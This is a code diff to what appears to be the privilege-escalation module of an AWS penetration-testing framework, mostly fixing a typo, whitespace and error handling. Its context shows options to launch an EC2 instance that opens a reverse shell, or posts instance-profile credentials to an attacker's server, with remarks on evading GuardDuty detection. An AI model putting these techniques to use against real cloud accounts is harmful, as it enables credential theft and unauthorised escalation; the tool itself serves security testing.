@@ -712,7 +712,7 @@ def SetExistingDefaultPolicyVersion(pacu_main, print, input, fetch_data):
     if not target_policy:  # If even after everything else, there is still no policy: exit
         print('  All methods of enumerating a valid policy have failed. Skipping to the next privilege escalation method...\n')
         return False
-    
+
     print('Now printing the policy document for each version of the target policy...\n')
     for version in target_policy['Versions']:
         version_document = client.get_policy_version(
@@ -761,7 +761,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
         region = regions[0]
     else:
         while not region:
-            all_ec2_regions = pacumain.get_regions('ec2', check_session=False)
+            all_ec2_regions = pacu_main.get_regions('ec2', check_session=False)
             region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not region:
                 return False
@@ -790,7 +790,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
     ami = amis_by_region[region]
 
     print('    Targeting region {}...'.format(region))
-    
+
     client = pacu_main.get_boto3_client('iam')
 
     response = client.list_instance_profiles()
@@ -818,14 +818,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
         print('    No instance profiles with roles attached were found in region {}. Skipping to the next privilege escalation method...\n'.format(region))
         return False
 
-    # Need to figure out how to get credentials out of the instance or access to the instance with as few privs as possible
-    # Could reverse shell on startup, but would require user to have a server listening+outbound internet (no guardduty trigger if could make aws calls from the reverse shell)
-    # Could run an AWS command on startup, but would require outbound internet (No guardduty trigger)
-    # Could post the keys to a web server, but would require user to have a server listening+outbound internet (would trigger guardduty after using the keys outside the instance)
-
-    ready_to_start = False
-
-    while not ready_to_start:
+    while True:
         print('Ready to start the new EC2 instance. What would you like to do?')
         print('  1) Open a reverse shell on the instance back to a server you control. Note: Restart the instance to resend the reverse shell connection (will not trigger GuardDuty, requires outbound internet).')
         print('  2) Run an AWS CLI command using the instance profile credentials on startup. Note: Restart the instance to run the command again (will not trigger GuardDuty, requires outbound internet).')
@@ -855,6 +848,9 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
                 print(response)
 
                 return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
         elif method == 2:
             # Run AWS CLI command
             aws_cli_command = input('What is the AWS CLI command you would like to execute (example: "aws iam get-user --user-name Bob")? ')
@@ -875,6 +871,9 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
                 print(response)
 
                 return True
+            except Exception as error:
+                print('Failed to start the EC2 instance, skipping to the next privilege escalation method: {}\n'.format(error))
+                return False
         elif method == 3:
             # HTTP POST
             http_server = input('The EC2 instance will make an HTTP POST request to your server containing temporary credentials for the instance profile. Where should this data be POSTed (example: http://my-server.com/creds)? ')
@@ -937,7 +936,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
                     priv_key_file.write(ssh_private_key)
                 print('  SSH private key (also saved to ./sessions/{}/downloads/{}):'.format(session.name, ssh_key_name))
                 print(ssh_private_key)
-                
+
                 print('  SSH fingerprint:')
                 print(ssh_fingerprint)
 
@@ -949,7 +948,6 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
             # Skip
             print('Skipping to next privilege escalation method...\n')
             return False
-
 
 
 def CreateAccessKey(pacu_main, print, input, fetch_data):
